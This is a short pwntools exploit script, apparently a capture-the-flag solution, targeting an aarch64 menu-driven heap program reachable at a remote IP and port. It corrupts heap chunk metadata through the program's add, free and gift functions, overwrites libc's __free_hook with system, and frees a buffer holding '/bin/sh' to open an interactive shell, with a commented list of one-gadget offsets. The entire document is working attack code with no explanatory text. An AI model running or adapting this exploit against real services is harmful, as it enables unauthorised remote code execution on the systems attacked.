from pwn import*
def menu(ch):
	p.sendlineafter('choice:',str(ch))
def add(content1,content2,sign):
	menu(1)
	p.sendafter('cx:',content1)
	p.sendafter('cy:',content2)
	p.sendlineafter('delete?',str(sign))
def free(index,content):
	menu(3)
	p.sendline(str(index))
	p.send(content)
def gift(content1,content2,sign):
	menu(4)
	p.sendafter('cx:',content1)
	p.sendafter('cy:',content2)
	p.sendlineafter('delete?',str(sign))

p = process("qemu-aarch64 -g 5555 -L . ./main",shell=True)
p = remote('183.129.189.60',10034)
elf =ELF('./main')
libc =ELF('./libc.so.6')
p.send('/bin/sh\x00')

add('FMYY','FMYY',0)
add('FMYY','FMYY',0)
add('FMYY','FMYY',1)

gift('FMYY',p64(0x31),1)
free(1,p64(0) + p64(0x41) + 'FMYYSSSS')

gift('FMYY',p64(0x4000830000 + libc.sym['__free_hook']),0)
#og = [0x3F14c,0x3F150,0x3F174,0x3F198,0x63E80,0x63E78,0x63E6C] 
free(2,p64(libc.sym['system'] + 0x4000830000))
menu(5)
p.interactive()
